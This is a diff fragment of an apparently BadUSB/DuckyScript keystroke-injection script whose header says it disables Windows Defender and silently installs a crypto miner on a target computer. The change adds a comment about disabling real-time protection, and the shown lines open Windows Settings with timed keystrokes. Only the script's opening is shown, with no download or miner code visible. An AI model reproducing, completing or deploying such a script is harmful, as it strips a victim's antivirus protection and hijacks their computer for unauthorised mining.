@@ -1,7 +1,7 @@
 REM --- Kills windows defender and installs a silent crypto miner on target computer
 REM --- Made by Disabled#8989
 
-
+REM --- DISABLE REAL TIME PROTECTION
 DELAY 1000
 GUI i
 DELAY 1000
